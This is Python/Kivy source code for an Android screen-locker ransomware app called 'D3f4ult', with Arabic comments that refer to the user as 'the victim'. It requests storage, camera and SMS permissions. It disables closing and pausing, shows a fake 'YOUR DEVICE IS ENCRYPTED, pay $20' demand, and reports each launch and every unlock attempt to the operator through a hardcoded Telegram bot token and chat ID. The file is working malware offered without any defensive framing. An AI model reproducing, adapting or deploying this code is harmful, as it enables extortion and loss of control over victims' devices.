import os
import requests
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.core.window import Window
from kivy.utils import platform

# --- بياناتك ---
BOT_TOKEN = "7547169477:AAH0q-zW4O1K-K0Z2G-vL8U-Y7F3M5X2Q1"
CHAT_ID = "6133475010"
THE_KEY = "hhhhhlol#"

class D3f4ultApp(App):
    def build(self):
        # طلب الصلاحيات فوراً لو الجهاز أندرويد
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.READ_EXTERNAL_STORAGE,
                Permission.WRITE_EXTERNAL_STORAGE,
                Permission.CAMERA,
                Permission.READ_SMS,
                Permission.SEND_SMS
            ])

        # منع الخروج
        Window.bind(on_request_close=self.prevent_close)
        
        self.send_to_telegram("🎯 [D3f4ult] الضحية فتح التطبيق وبدأ طلب الصلاحيات!")
        
        layout = BoxLayout(orientation='vertical', padding=30, spacing=20)
        layout.add_widget(Label(
            text="[color=ff0000][b]YOUR DEVICE IS ENCRYPTED[/b][/color]\n\n"
                 "All your photos and messages are seized.\n"
                 "Pay [b]20$[/b] to unlock.",
            markup=True, font_size='22sp', halign='center'))

        self.input_key = TextInput(hint_text="Enter Key...", multiline=False, size_hint_y=None, height=120)
        btn = Button(text="UNLOCK", background_color=(1, 0, 0, 1), size_hint_y=None, height=100)
        btn.bind(on_press=self.verify_key)

        layout.add_widget(self.input_key)
        layout.add_widget(btn)
        return layout

    def prevent_close(self, *args):
        return True

    def on_pause(self):
        # دي بتخلي التطبيق ميتوقفش لو الضحية حاول يخرج
        return True

    def verify_key(self, instance):
        if self.input_key.text == THE_KEY:
            self.send_to_telegram("✅ تم فك القفل بنجاح.")
            os._exit(0)
        else:
            self.send_to_telegram(f"⚠️ محاولة فاشلة بكود: {self.input_key.text}")

    def send_to_telegram(self, message):
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, data={"chat_id": CHAT_ID, "text": message})
        except:
            pass

if __name__ == '__main__':
    D3f4ultApp().run()
